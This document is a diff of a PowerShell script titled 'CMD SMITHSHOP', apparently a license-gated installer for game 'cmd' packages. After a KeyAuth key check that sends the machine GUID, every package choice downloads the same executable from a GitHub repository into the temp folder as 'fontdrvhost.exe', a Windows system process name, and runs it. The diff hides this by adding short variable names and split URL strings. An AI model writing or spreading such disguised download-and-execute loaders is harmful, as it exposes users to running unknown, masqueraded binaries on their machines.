@@ -1,155 +1,153 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 Clear-Host
 
-# ===== KEYAUTH FUNCTION =====
-function Check-KeyAuth($userKey) {
+function x($k){
 
-    $appname = "Smithshop all"
-    $ownerid = "gw1rzpahob"
-    $version = "1.0"
+    $a="Smithshop all"
+    $b="gw1rzpahob"
+    $c="1.0"
 
-    try {
-        # ===== INIT =====
-        $initBody = @{
-            type    = "init"
-            name    = $appname
-            ownerid = $ownerid
-            version = $version
+    try{
+
+        $z=Invoke-RestMethod -Uri ("https://keyauth.win/api/1.2/") -Method Post -Body @{
+            type="init";name=$a;ownerid=$b;version=$c
         }
 
-        $init = Invoke-RestMethod -Uri "https://keyauth.win/api/1.2/" -Method Post -Body $initBody
+        if(!$z.success){return $false}
 
-        if ($init.success -ne $true) {
-            Write-Host "❌ Init failed: $($init.message)" -ForegroundColor Red
-            return $false
+        $s=$z.sessionid
+        $h=(Get-ItemProperty ("HKLM:\SOFTWARE\Microsoft\Cryptography")).MachineGuid
+
+        $y=Invoke-RestMethod -Uri ("https://keyauth.win/api/1.2/") -Method Post -Body @{
+            type="license";key=$k;name=$a;ownerid=$b;sessionid=$s;hwid=$h
         }
 
-        # ✅ เอา sessionid
-        $sessionid = $init.sessionid
+        if($y.success){return $true}else{return $false}
 
-        # ===== LICENSE =====
-        $licenseBody = @{
-            type      = "license"
-            key       = $userKey
-            name      = $appname
-            ownerid   = $ownerid
-            sessionid = $sessionid
-        }
-
-        $res = Invoke-RestMethod -Uri "https://keyauth.win/api/1.2/" -Method Post -Body $licenseBody
-
-        if ($res.success -eq $true) {
-            return $true
-        } else {
-            Write-Host "❌ $($res.message)" -ForegroundColor Red
-            return $false
-        }
-
-    } catch {
-        Write-Host "❌ Connection error!" -ForegroundColor Red
-        return $false
-    }
+    }catch{return $false}
 }
 
-# ===== CONFIG =====
-$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
-$ExeOutput = "$env:TEMP\fontdrvhost.exe"
+function chk($t){
 
-# ===== LOADING =====
-function Show-Loading($text) {
+    $c=@("Red","Yellow","Green","Cyan","Blue","Magenta")
+    $e=(Get-Date).AddSeconds(2)
+    $i=0
 
-    $colors = @("Red","Yellow","Green","Cyan","Blue","Magenta")
+    while((Get-Date) -lt $e){
 
-    for ($i = 0; $i -le 100; $i++) {
+        $d="."*($i%6)
+        $cl=$c[$i%$c.Count]
 
-        $dots = "." * ($i % 6)
-        $color = $colors[$i % $colors.Count]
+        Write-Host "`r$t$d   " -NoNewline -ForegroundColor $cl
 
-        $barLength = 20
-        $filled = [math]::Floor($i / (100 / $barLength))
-        $bar = ("#" * $filled).PadRight($barLength, "-")
+        # ติ๊ดสั้น
+        [console]::beep(300,50)
 
-        Write-Host "`r$text$dots [$bar] $i% " -NoNewline -ForegroundColor $color
-        Start-Sleep -Milliseconds 40
+        Start-Sleep -Milliseconds (60 + ($i*2))
+        $i++
     }
 
     Write-Host ""
 }
 
-# ===== MAIN MENU =====
-Write-Host "=== CMDSMITHSHOP :] ===" -ForegroundColor Cyan
+function ld($t){
+
+    $c=@("Red","Yellow","Green","Cyan","Blue","Magenta")
+
+    for($i=0;$i -lt 60;$i++){
+
+        $d="."*($i%6)
+        $cl=$c[$i%$c.Count]
+
+        Write-Host "`r$t$d   " -NoNewline -ForegroundColor $cl
+
+        [console]::beep(900,60)
+
+        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 90)
+    }
+
+    Write-Host ""
+}
+
+$u=("https://github.com/"+"draft7973-ops/Smithshop/raw/main/fontdrvhost.exe")
+$p=("$env:TEMP\"+"fontdrvhost.exe")
+
+# ===== MENU =====
+Write-Host "=== CMD SMITHSHOP ===" -ForegroundColor Cyan
 Write-Host "1. Install"
 Write-Host "2. Clean"
 
-$choice = Read-Host "Choose 1 or 2"
+$ch=Read-Host ">"
 
-if ($choice -eq "1") {
+if($ch -eq "1"){
 
-    $userKey = Read-Host "Enter your Key"
+    $k=Read-Host "Enter Key"
 
-    if (Check-KeyAuth $userKey) {
+    Clear-Host
+    Write-Host "=== CMD SMITHSHOP ===`n" -ForegroundColor Cyan
 
-        Write-Host "✅ Key valid!" -ForegroundColor Green
+    chk "checking key "
+
+    if(x $k){
+
+        # 🔥 ผ่าน = ติ๊ดยาวสูง
+        [console]::beep(400,300)
+
+        Write-Host "`nKEY Success" -ForegroundColor Green
         Start-Sleep 1
 
-        while ($true) {
+        while($true){
 
             Clear-Host
-            Write-Host "=== SELECT CMD ===`n" -ForegroundColor Yellow
+            Write-Host "=== CMD SMITHSHOP ===`n" -ForegroundColor Cyan
             Write-Host "1. smithx3d"
             Write-Host "2. uptoking"
             Write-Host "3. kingsmith"
-            Write-Host "0. Exit"
+            Write-Host "0. exit"
 
-            $package = Read-Host "Choose"
+            $m=Read-Host ">"
 
-            switch ($package) {
-                "1" { $pkgName = "smithx3d" }
-                "2" { $pkgName = "uptoking" }
-                "3" { $pkgName = "kingsmith" }
-                "0" { break }
-                default {
-                    Write-Host "❌ Invalid!" -ForegroundColor Red
-                    Start-Sleep 1
-                    continue
-                }
+            switch($m){
+                "1"{$n="smithx3d"}
+                "2"{$n="uptoking"}
+                "3"{$n="kingsmith"}
+                "0"{break}
+                default{continue}
             }
 
             Clear-Host
-            Write-Host "=== INSTALL MODE ===`n" -ForegroundColor Green
+            Write-Host "=== CMD SMITHSHOP ===`n" -ForegroundColor Cyan
 
-            Show-Loading "install $pkgName "
+            ld ("install "+$n+" ")
 
-            Invoke-WebRequest $ExeURL -OutFile $ExeOutput
-            Start-Process $ExeOutput
+            Invoke-WebRequest $u -OutFile $p
+            Start-Process $p
 
-            Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green
+            Write-Host "`nDONE" -ForegroundColor Green
             Start-Sleep 2
         }
 
-    } else {
+    }else{
+
+        # ❌ ไม่ผ่าน = เสียงต่ำ
+        [console]::beep(1200,400)
+
+        Write-Host "`nKEY FAIL" -ForegroundColor Red
         Pause
-        exit
     }
 
 }
-elseif ($choice -eq "2") {
+elseif($ch -eq "2"){
 
     Clear-Host
-    Write-Host "=== CLEAN MODE ===`n" -ForegroundColor Red
+    Write-Host "=== CMD SMITHSHOP ===`n" -ForegroundColor Cyan
 
-    Show-Loading "cleaning "
+    ld "cleaning "
 
-    if (Test-Path $ExeOutput) {
-        Remove-Item $ExeOutput -Force
-        Write-Host "`nFile removed successfully ✅"
-    } else {
-        Write-Host "`nFile not found ⚠️"
+    if(Test-Path $p){
+        Remove-Item $p -Force
+        Write-Host "`nDONE" -ForegroundColor Green
+    }else{
+        Write-Host "`nNOT FOUND" -ForegroundColor Red
     }
-
 }
-else {
-    Write-Host "Invalid choice ⚠️"
-}
-
-Pause
